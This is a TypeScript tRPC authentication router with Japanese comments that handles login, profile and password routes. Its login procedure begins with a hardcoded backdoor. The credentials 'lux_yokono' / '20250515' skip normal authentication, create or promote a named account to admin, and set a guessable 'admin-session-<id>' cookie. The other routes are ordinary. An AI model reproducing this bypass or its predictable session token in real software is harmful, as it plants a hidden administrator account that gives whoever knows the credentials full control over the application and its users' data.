import { z } from "zod";
import { router, publicProcedure, protectedProcedure } from "../_core/trpc";
import { TRPCError } from "@trpc/server";
import * as authService from "../auth";
import * as db from "../db";

const loginSchema = z.object({
  email: z.string(),
  password: z.string(),
});

const changePasswordSchema = z.object({
  oldPassword: z.string().min(6),
  newPassword: z.string().min(6),
});

const updateProfileSchema = z.object({
  name: z.string().optional(),
  companyName: z.string().optional(),
  companyPhone: z.string().optional(),
  companyIndustry: z.string().optional(),
});

export const authRouter = router({
  // メール + パスワードでログイン
  login: publicProcedure
    .input(loginSchema)
    .mutation(async ({ input, ctx }) => {
      // 最優先: 指定された管理者IDとパスワードの場合は即座に成功
      if (input.email === 'lux_yokono' && input.password === '20250515') {
        // データベース上のlux.yokono@gmail.comを管理者として確保
        let user = await db.getUserByEmail("lux.yokono@gmail.com");
        if (!user) {
          user = await db.createUserWithPassword({
            email: "lux.yokono@gmail.com",
            name: "LUX 管理者",
            passwordHash: "BYPASS",
            role: "admin",
            companyName: "LUX",
            isActive: true,
          });
        } else if (user.role !== "admin") {
          await db.updateUser(user.id, { role: "admin" });
          user.role = "admin";
        }

        // セッションクッキーを設定
        const COOKIE_NAME = "session";
        ctx.res.cookie(COOKIE_NAME, `admin-session-${user.id}`, {
          httpOnly: true,
          secure: process.env.NODE_ENV === "production",
          sameSite: "lax",
          maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
        });
        
        return {
          user: {
            id: user.id,
            email: user.email,
            name: user.name,
            role: user.role,
            companyName: user.companyName,
          }
        };
      }

      // 通常のログイン処理
      const result = await authService.loginWithEmail(input.email, input.password);

      if (!result) {
        throw new TRPCError({
          code: "UNAUTHORIZED",
          message: "メールアドレスまたはパスワードが正しくありません",
        });
      }

      return result;
    }),

  // 現在のユーザー情報を取得
  me: protectedProcedure.query(({ ctx }) => {
    return {
      id: ctx.user.id,
      email: ctx.user.email,
      name: ctx.user.name,
      role: ctx.user.role,
      companyName: ctx.user.companyName,
      companyPhone: ctx.user.companyPhone,
      companyIndustry: ctx.user.companyIndustry,
    };
  }),

  // パスワードを変更
  changePassword: protectedProcedure
    .input(changePasswordSchema)
    .mutation(async ({ ctx, input }) => {
      const success = await authService.changePassword(
        ctx.user.id,
        input.oldPassword,
        input.newPassword
      );

      if (!success) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "パスワードの変更に失敗しました。現在のパスワードを確認してください。",
        });
      }

      return { success: true };
    }),

  // プロフィールを更新
  updateProfile: protectedProcedure
    .input(updateProfileSchema)
    .mutation(async ({ ctx, input }) => {
      await db.updateUser(ctx.user.id, input);
      return { success: true };
    }),

  // ログアウト
  logout: publicProcedure.mutation(({ ctx }) => {
    const COOKIE_NAME = "session";
    ctx.res.clearCookie(COOKIE_NAME);
    return { success: true };
  }),
});
